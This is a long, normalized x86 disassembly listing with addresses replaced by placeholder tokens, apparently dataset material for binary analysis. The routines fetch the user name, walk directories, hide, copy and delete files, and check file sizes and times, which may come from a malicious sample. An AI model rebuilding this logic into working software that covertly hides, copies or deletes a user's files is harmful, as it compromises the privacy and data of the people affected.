lea ecx [ esp + 0x24 ]
push ecx
push edx
call [ GetUserNameA@IAT ]
lea edx [ esp + 0x354 ]
push edx
push ebp
call sub_4063d0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x454 ]
push 0x200
push edx
push eax
push ebp
call [ esp + 0x24 ]
lea ecx [ esp + 0x454 ]
push ecx
call sub_404870
add esp 0x4
lea ecx [ esp + 0x154 ]
push rw-data
push ecx
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x154 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x454 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push ebp
call [ rw-data ]
mov ebp [ esp + 0x20 ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x354 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x154 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x154 ]
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
lea edi [ esp + 0x454 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x154 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + ebx + 0x754 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x154 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x154 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x354 ]
lea edx [ ebx + ecx + 0x1 ]
mov ecx [ esp + 0x34 ]
mov [ esp + edx + 0x754 ] ecx
add edx 0x4
lea ebx [ esp + edx + 0x754 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x354 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea ebx [ edx + ecx + 0x1 ]
mov ecx [ esp + 0x40 ]
lea edx [ esp + 0x2c ]
push edx
mov [ esp + ebx + 0x758 ] ecx
push ebp
add ebx 0x4
call [ rw-data ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x454 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub_404e00
push esi
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
mov eax [ esp + 0x8 ]
push 0x1
push eax
call sub_4046f0
add esp 0x8
test eax eax
je r-xdata
xor eax eax
pop esi
retn
push 0x1
push eax
call esi
pop esi
retn
sub_404e70
push esi
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
mov eax [ esp + 0x8 ]
push eax
push 0x0
push 0x1
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn
push 0x1
push eax
call esi
pop esi
retn
sub_404f00
sub esp 0x400
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x200 ]
push ebx
push esi
push edi
mov edi [ rw-data ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x20c ]
or ecx 0xffffffff
[ edi ]
mov eax [ rw-data ]
not ecx
dec ecx
mov ebx ecx
inc ebx
cmp ebx eax
jge r-xdata
mov [ rw-data ] 0x4f
call sub_405560
pop edi
pop esi
pop ebx
add esp 0x400
retn
push ebp
lea edx [ esp + 0x10 ]
push 0x4c
push edx
call sub_405590
add esp 0x8
lea ecx [ esp + 0x10 ]
push ecx
call [ rw-data ]
jmp r-xdata
lea edi [ esp + 0x210 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
lea ebp [ esp + 0x10 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ rw-data ]
lea edx [ ecx + ebx ]
or ecx 0xffffffff
mov edi edx
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebp
mov ebp ecx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x14 ]
push edx
lea ebx [ ebx + ecx + 0x1 ]
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax + ebx ] 0x30
jne r-xdata
pop ebp
mov eax [ rw-data ]
inc ebx
cmp ebx eax
jl r-xdata
sub_405020
mov edx [ rw-data ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
push eax
push edx
call sub_409129
add esp 0x8
neg eax
sbb al al
and al 0xf6
add al 0x4f
mov [ rw-data ] al
call sub_405560
pop edi
retn
sub_405060
push ecx
mov edx [ rw-data ]
push ebx
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi edx
push edx
mov bl [ ecx + edx + 0x1 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi edx
mov al [ ecx + edx + 0x2 ]
or ecx 0xffffffff
mov [ esp + 0xe ] al
xor eax eax
[ edi ]
not ecx
dec ecx
mov cl [ ecx + edx + 0x3 ]
mov [ esp + 0xf ] cl
call [ GetFileAttributesA@IAT ]
mov cl 0x31
pop edi
cmp bl cl
pop ebx
jne r-xdata
and al 0xfe
or al 0x1
jmp r-xdata
and al 0xfd
or al 0x2
jmp r-xdata
cmp [ esp + 0x2 ] cl
jne r-xdata
and al 0xfb
or al 0x4
jmp r-xdata
cmp [ esp + 0x3 ] cl
jne r-xdata
mov edx [ rw-data ]
push eax
push edx
call [ SetFileAttributesA@IAT ]
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_405560
pop ecx
retn
sub_405110
mov eax [ rw-data ]
push 0x0
push 0x2
push 0x2
push 0x0
push 0x0
push 0x40000000
push eax
call [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov [ rw-data ] 0x45
push eax
call [ rw-data ]
mov [ rw-data ] 0x4f
jmp r-xdata
jmp sub_405560
sub_405150
mov ecx [ rw-data ]
mov eax [ rw-data ]
sub esp 0x210
mov edx ecx
shr ecx 0x2
push ebx
push ebp
push esi
push edi
mov esi eax
lea edi [ esp + 0x20 ]
[ edi ] [ esi ]
mov ecx edx
push 0x5c
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_409000
push eax
call sub_405420
lea eax [ esp + 0x2c ]
push 0x5c
push eax
call sub_409000
add esp 0x14
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x20 ]
[ edi ]
not ecx
sub edi ecx
push 0x7d00
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov [ esp + 0x1c ] 0x42
and ecx 0x3
[ edi ] [ esi ]
call sub_408e82
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov [ eax + 0x1 ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x210
retn
lea eax [ esp + 0x20 ]
push eax
call sub_4053a0
mov esi eax
add esp 0x4
cmp esi 0xffffffff
je r-xdata
push ebx
call sub_4091a9
add esp 0x4
test esi esi
jne r-xdata
lea ecx [ esi + esi * 4 ]
lea edx [ esp + 0x18 ]
shl ecx 0x6
add ecx 0x5
push 0x5
push edx
mov [ esp + 0x21 ] ecx
call sub_403320
add esp 0x8
lea eax [ esp + 0x20 ]
push ebx
push eax
call [ rw-data ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov esi 0x1
push ebx
call sub_405480
add esp 0x4
test eax eax
je r-xdata
or ecx eax
mov edi rw-data
xor eax eax
lea edx [ ebx + 0x2c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
push ebx
push 0x140
push ebx
call sub_403b30
push 0x140
push ebx
call sub_403260
push ebx
call sub_4091a9
add esp 0x1c
pop edi
pop esi
pop ebp
pop ebx
add esp 0x210
retn
xor ebp ebp
dec esi
test esi esi
mov [ esp + 0x10 ] esi
jle r-xdata
lea edx [ esp + 0x14 ]
push edx
push ebx
push 0x140
push ebx
call sub_403b30
push 0x140
push ebx
call sub_403260
add esp 0x18
test eax eax
je r-xdata
push edi
call [ FindClose@IAT ]
push ebx
push edi
call sub_405340
add esp 0x8
cmp eax 0xffffffff
je r-xdata
push ebx
call sub_4091a9
add esp 0x4
push edi
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x210
retn
add ebp eax
lea esi [ eax + eax * 4 ]
lea eax [ esp + 0x14 ]
shl esi 0x6
push eax
push ebx
push esi
push ebx
call sub_403b30
push esi
push ebx
call sub_403260
add esp 0x18
test eax eax
je r-xdata
cmp ebp [ esp + 0x10 ]
jl r-xdata
sub_405340
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov edi [ esp + 0x14 ]
xor esi esi
push edi
push ebx
call [ rw-data ]
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn
push edi
call sub_405480
add esp 0x4
test eax eax
je r-xdata
cmp esi 0x64
jge r-xdata
inc esi
add edi 0x140
push edi
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
sub_4053a0
mov ecx [ esp + 0x4 ]
sub esp 0x140
lea eax [ esp ]
push esi
push edi
push eax
push ecx
xor edi edi
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax edi
pop edi
pop esi
add esp 0x140
retn
lea edx [ esp + 0x8 ]
push edx
call sub_405480
add esp 0x4
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
inc edi
push esi
call [ FindClose@IAT ]
pop edi
or eax 0xffffffff
pop esi
add esp 0x140
retn
lea eax [ esp + 0x8 ]
push eax
push esi
call [ rw-data ]
test eax eax
je r-xdata
push esi
call [ FindClose@IAT ]
jmp r-xdata
sub_405420
mov edx [ esp + 0x4 ]
mov [ rw-data ] 0x0
test edx edx
je r-xdata
retn
push esi
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x2
jb r-xdata
mov [ edx ] 0x0
test edx edx
jne r-xdata
mov eax [ rw-data ]
mov [ eax * 4 + rw-data ] esi
inc eax
mov [ rw-data ] eax
lea esi [ edx + 0x1 ]
push 0x3b
push esi
call sub_4092f0
mov edx eax
add esp 0x8
test edx edx
je r-xdata
pop edi
pop esi
sub_405480
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
test [ ebp ] 0x10
je r-xdata
add ebp 0x2c
push 0x2e
push ebp
call sub_409000
mov [ esp + 0x18 ] eax
mov eax [ rw-data ]
add esp 0x8
mov [ esp + 0x18 ] 0x0
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov ebx rw-data
mov eax [ esp + 0x18 ]
mov ecx [ rw-data ]
inc eax
add ebx 0x4
cmp eax ecx
mov [ esp + 0x18 ] eax
jl r-xdata
mov esi [ lstrcmpiA@IAT ]
push rw-data
push edx
call esi
test eax eax
je r-xdata
mov edx [ ebx ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x2
jb r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ ebx ]
push rw-data
push ecx
call esi
test eax eax
je r-xdata
mov eax [ ebx ]
or ecx 0xffffffff
lea edx [ eax + 0x2 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
mov esi ecx
je r-xdata
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push edx
sub ecx esi
lea eax [ ecx + ebp ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
sub_405590
mov eax [ rw-data ]
sub esp 0x844
test eax eax
push ebx
push ebp
push esi
push edi
je r-xdata
mov eax [ esp + 0x858 ]
lea ecx [ esp + 0x654 ]
push eax
push rw-data
push ecx
call sub_409157
add esp 0xc
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x654 ]
push edx
push eax
call [ rw-data ]
mov ebp [ esp + 0x85c ]
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x844
retn
cmp ebp 0x4c
jne r-xdata
mov ebx [ WaitForSingleObject@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x844
retn
mov edx [ esp + 0x858 ]
push edx
call [ RemoveDirectoryA@IAT ]
push esi
call [ FindClose@IAT ]
cmp [ esp + 0x40 ] 0x2e
je r-xdata
mov esi [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push ecx
push esi
call [ rw-data ]
test eax eax
je r-xdata
lea edi [ esp + 0x40 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x354 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ esp + 0x858 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov al [ esp + 0x14 ]
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x354 ]
push ecx
push edx
test al 0x10
push rw-data
je r-xdata
lea eax [ esp + 0x160 ]
push eax
call sub_409157
lea eax [ ebp - 0x4c ]
add esp 0x10
cmp eax 0xd
ja r-xdata
lea eax [ esp + 0x460 ]
push eax
call sub_409157
add esp 0x10
cmp ebp 0x4e
jl r-xdata
xor ecx ecx
mov cl [ eax + lookup_table_405884 ]
jmp [ ecx * 4 + jump_table_405874 ]
lea eax [ esp + 0x454 ]
push ebp
push eax
call sub_405590
add esp 0x8
test eax eax
je r-xdata
cmp ebp 0x4f
jg r-xdata
lea edx [ esp + 0x154 ]
push 0x0
push edx
call [ SetFileAttributesA@IAT ]
lea eax [ esp + 0x154 ]
push eax
call [ rw-data ]
jmp r-xdata
lea ecx [ esp + 0x154 ]
push 0x44
push ecx
call sub_405bf0
add esp 0x8
test eax eax
je r-xdata
lea ecx [ esp + 0x14 ]
push ecx
call sub_405480
add esp 0x4
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push eax
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x844
retn
jmp r-xdata
lea ecx [ esp + 0x454 ]
push 0x46
push ecx
call sub_405bf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x844
retn
mov edx [ rw-data ]
push 0xea60
push edx
call ebx
cmp eax 0x102
je r-xdata
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x154 ]
push edx
push eax
call sub_405f10
add esp 0x8
jmp r-xdata
mov edx [ rw-data ]
push 0xea60
push edx
call ebx
cmp eax 0x102
je r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x844
retn
cmp ebp 0x4f
jne r-xdata
lea eax [ esp + 0x154 ]
push eax
push 0x0
call sub_405c60
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
push eax
lea edx [ esp + 0x158 ]
push ecx
push edx
call sub_405fc0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ rw-data ]
push 0xea60
push ecx
call ebx
cmp eax 0x102
je r-xdata
cmp ebp 0x4f
jne r-xdata
lea edx [ esp + 0x154 ]
push 0x0
push edx
call [ rw-data ]
lea eax [ esp + 0x154 ]
push eax
call [ rw-data ]
jmp r-xdata
sub_4058a0
sub esp 0x200
mov [ rw-data ] 0x4f
push edi
call sub_405560
mov edx [ rw-data ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
cmp [ edx + ecx - 0x2 ] 0x3a
jne r-xdata
push ebx
push esi
lea eax [ esp + 0xc ]
push 0x200
push eax
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ CreateDirectoryA@IAT ]
lea ecx [ esp + 0xc ]
push ecx
call [ GetFileAttributesA@IAT ]
or al 0x2
lea edx [ esp + 0xc ]
push eax
push edx
call [ rw-data ]
mov ecx [ rw-data ]
lea eax [ esp + 0xc ]
push eax
push ecx
call sub_405960
add esp 0x8
pop esi
pop ebx
cmp [ edx + ecx - 0x1 ] 0x5c
je r-xdata
pop edi
add esp 0x200
retn
sub_405960
mov eax [ rw-data ]
sub esp 0xe54
test eax eax
push ebx
push ebp
push esi
push edi
je r-xdata
mov ebx [ esp + 0xe68 ]
lea eax [ esp + 0x864 ]
push ebx
push rw-data
push eax
call sub_409157
add esp 0xc
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x864 ]
push ecx
push edx
call [ rw-data ]
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xe54
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xe54
retn
mov ebp [ esp + 0xe6c ]
push esi
call [ FindClose@IAT ]
cmp [ esp + 0x50 ] 0x2e
je r-xdata
mov esi [ esp + 0x10 ]
lea eax [ esp + 0x24 ]
push eax
push esi
call [ rw-data ]
test eax eax
je r-xdata
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x164 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov al [ esp + 0x24 ]
and ecx 0x3
test al 0x10
[ edi ] [ esi ]
je r-xdata
lea eax [ esp + 0x14 ]
push eax
call [ GetLocalTime@IAT ]
mov edx [ esp + 0x1e ]
mov ecx [ rw-data ]
mov eax [ esp + 0x1c ]
and edx 0xffff
push ecx
mov ecx [ esp + 0x1e ]
push edx
mov edx [ esp + 0x1e ]
and eax 0xffff
and ecx 0xffff
push eax
and edx 0xffff
push ecx
push edx
lea eax [ esp + 0x278 ]
push rw-data
push eax
call sub_409157
mov eax [ rw-data ]
add esp 0x1c
mov ecx eax
inc eax
cmp ecx 0x1869f
mov [ rw-data ] eax
jle r-xdata
mov ecx [ rw-data ]
lea edx [ esp + 0x364 ]
push ecx
push rw-data
push edx
call sub_409157
mov eax [ rw-data ]
add esp 0xc
mov ecx eax
inc eax
cmp ecx 0x1869f
mov [ rw-data ] eax
jle r-xdata
lea edx [ esp + 0x164 ]
push 0x2e
push edx
call sub_409000
mov esi eax
lea eax [ esp + 0x16c ]
push eax
push ebx
lea ecx [ esp + 0xc74 ]
push rw-data
push ecx
call sub_409157
add esp 0x18
test esi esi
jne r-xdata
mov [ rw-data ] 0x0
lea edx [ esp + 0x164 ]
lea eax [ esp + 0xa64 ]
push edx
push ebx
push rw-data
push eax
call sub_409157
lea ecx [ esp + 0x374 ]
lea edx [ esp + 0x474 ]
push ecx
push ebp
push rw-data
push edx
call sub_409157
add esp 0x20
lea eax [ esp + 0x464 ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea ecx [ esp + 0x464 ]
lea edx [ esp + 0xa64 ]
push ecx
push edx
call sub_405960
add esp 0x8
test eax eax
je r-xdata
mov [ rw-data ] 0x0
inc esi
lea ecx [ esp + 0x264 ]
push esi
push ecx
push ebp
lea edx [ esp + 0x670 ]
push rw-data
push edx
call sub_409157
add esp 0x14
lea edx [ esp + 0x264 ]
lea eax [ esp + 0x664 ]
push edx
push ebp
push rw-data
push eax
call sub_409157
add esp 0x10
jmp r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xe54
retn
jmp r-xdata
lea eax [ esp + 0x664 ]
push 0x0
lea ecx [ esp + 0xc68 ]
push eax
push ecx
call [ CopyFileA@IAT ]
jmp r-xdata
sub_405bf0
sub esp 0x400
push ebx
push esi
mov esi [ esp + 0x40c ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
lea ebx [ esp + 0x11 ]
[ edi ]
mov al [ esp + 0x414 ]
mov edi esi
not ecx
dec ecx
mov [ esp + 0xc ] al
mov edx ecx
or ecx 0xffffffff
xor eax eax
add edx 0x6
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0xd ] edx
mov eax ecx
mov esi edi
mov edi ebx
push edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
call sub_403320
add esp 0x8
pop edi
pop esi
pop ebx
add esp 0x400
retn
sub_405c60
mov eax 0x2008
call sub_4094d0
mov eax [ rw-data ]
mov [ esp ] 0x1
cmp eax 0x53
je r-xdata
mov [ esp + 0x8 ] 0x53
cmp eax 0x59
sete al
dec eax
and al 0xec
add eax 0x59
mov [ esp + 0x8 ] al
jmp r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
mov ebx [ esp + 0x201c ]
mov edx 0x5
sub edx ebx
push esi
add eax edx
mov [ esp + 0x1d ] eax
call [ rw-data ]
lea eax [ esp + 0x18 ]
push 0x5
push eax
call sub_403320
add esp 0x8
test eax eax
jne r-xdata
cmp [ esp + 0x18 ] 0x59
jne r-xdata
push ebx
push ebp
mov ebp [ esp + 0x2018 ]
push esi
push edi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x3
push 0x80000000
push ebp
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
push ebp
call sub_409797
mov edi eax
push 0x0
push ebx
push edi
call sub_4096eb
mov eax [ rw-data ]
add esp 0x14
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2008
retn
mov [ rw-data ] 0x55
call sub_405560
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2008
retn
lea ecx [ esp + 0x18 ]
push 0x6
push ecx
mov [ esp + 0x21 ] 0x6
call sub_403320
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2008
retn
mov [ esp + 0x10 ] 0x0
push edi
push 0x2000
lea ecx [ esp + 0x20 ]
push 0x1
push ecx
call sub_409603
mov esi eax
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x28 ]
push edx
push eax
lea ecx [ esp + 0x30 ]
push esi
push ecx
call sub_403b30
lea edx [ esp + 0x38 ]
push esi
push edx
call sub_403260
add esp 0x28
test eax eax
je r-xdata
cmp esi 0x2000
jne r-xdata
cmp [ rw-data ] 0x41
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
call sub_4095ad
mov eax [ esp + 0x14 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2008
retn
push edi
call sub_4095ad
add esp 0x4
push 0x0
push ebp
call [ rw-data ]
push ebp
call [ rw-data ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x2008
retn
sub_405e30
mov eax [ rw-data ]
push 0x46
push eax
call sub_405bf0
mov ecx [ rw-data ]
add esp 0x8
push 0xea60
push ecx
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
retn
mov edx [ esp + 0x4 ]
mov eax [ rw-data ]
push edx
push eax
call sub_405590
add esp 0x8
mov [ rw-data ] 0x47
jmp sub_405560
sub_405e80
push esi
push edi
push 0xff
push rw-data
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push rw-data
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ rw-data ]
mov eax [ rw-data ]
push 0x5c
push eax
call sub_409000
mov esi eax
push esi
call sub_405420
mov [ esi ] 0x0
mov ecx [ rw-data ]
push 0x59
push ecx
call sub_405590
push rw-data
push 0x0
call sub_405c60
add esp 0x1c
push rw-data
call [ rw-data ]
pop edi
pop esi
retn
sub_405f10
push esi
push rw-data
push rw-data
call sub_409797
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop esi
retn
mov edx [ esp + 0x8 ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
push esi
[ edi ]
not ecx
push ecx
push 0x1
push edx
call sub_4097aa
mov edi [ esp + 0x20 ]
push esi
push 0x8
push 0x1
lea eax [ edi + 0x14 ]
push eax
call sub_4097aa
push esi
push 0x4
add edi 0x20
push 0x1
push edi
call sub_4097aa
push esi
call sub_4095ad
add esp 0x34
pop edi
sub_405f70
mov eax [ rw-data ]
push esi
push edi
push 0x200
push eax
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x4f
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ rw-data ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call sub_405e30
add esp 0x4
pop edi
pop esi
retn
sub_405fc0
sub esp 0x18
push ebx
push ebp
mov ebp [ esp + 0x24 ]
push esi
push edi
push 0x2e
push ebp
call sub_409000
mov edi [ lstrcmpiA@IAT ]
add esp 0x8
mov ebx eax
mov esi rw-data
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x18
retn
test ebx ebx
je r-xdata
push rw-data
push esi
call edi
test eax eax
je r-xdata
lea eax [ esi + 0x2 ]
lea ecx [ ebx + 0x1 ]
push eax
push ecx
call edi
test eax eax
je r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x3
push 0x80000000
push ebp
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
add esi 0x10
cmp esi rw-data
jl r-xdata
jmp r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
push esi
mov edi eax
call [ rw-data ]
cmp edi 0x7d0
jb r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp edi 0xf4240
ja r-xdata
push rw-data
push ebp
call sub_4093b0
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x18 ]
push edx
call [ GetSystemTime@IAT ]
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
call [ SystemTimeToFileTime@IAT ]
mov ebp [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
add ebp 0x80c2c000
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x30 ]
push edx
adc ebx 0xfffffda4
push eax
mov [ esp + 0x18 ] ebp
mov [ esp + 0x1c ] ebx
call [ CompareFileTime@IAT ]
xor ecx ecx
pop edi
test eax eax
setge cl
pop esi
pop ebp
mov eax ecx
pop ebx
add esp 0x18
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x18
retn
sub_4060e0
mov eax [ rw-data ]
sub esp 0x104
